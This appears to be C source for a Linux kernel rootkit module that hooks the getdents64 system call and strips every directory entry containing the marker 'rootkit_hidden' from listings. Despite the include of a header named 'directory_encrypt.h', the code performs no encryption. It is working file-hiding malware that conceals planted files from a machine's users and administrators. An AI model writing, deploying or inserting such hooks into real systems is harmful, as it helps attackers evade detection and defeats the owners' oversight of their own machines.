#include "directory_encrypt.h"
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/string.h>

asmlinkage long (*real_getdents64)(const struct pt_regs *);

#define HIDE_MARKER "rootkit_hidden"

struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret;
    struct linux_dirent64 *dirent, *cur, *prev = NULL;
    unsigned long offset = 0;

    ret = real_getdents64(regs);
    if (ret <= 0)
        return ret;

    dirent = kzalloc(ret, GFP_KERNEL);
    if (!dirent)
        return ret;

    if (copy_from_user(dirent, (void __user *)regs->di, ret)) {
        kfree(dirent);
        return ret;
    }

    while (offset < ret) {
        cur = (void *)dirent + offset;
        if (strnstr(cur->d_name, HIDE_MARKER, cur->d_reclen)) {
            if (cur == dirent) {
                ret -= cur->d_reclen;
                memmove(cur, (void *)cur + cur->d_reclen, ret);
                continue;
            } else if (prev) {
                prev->d_reclen += cur->d_reclen;
            }
        } else {
            prev = cur;
        }
        offset += cur->d_reclen;
    }

    if (copy_to_user((void __user *)regs->di, dirent, ret))
        ret = -EFAULT;

    kfree(dirent);
    return ret;
}
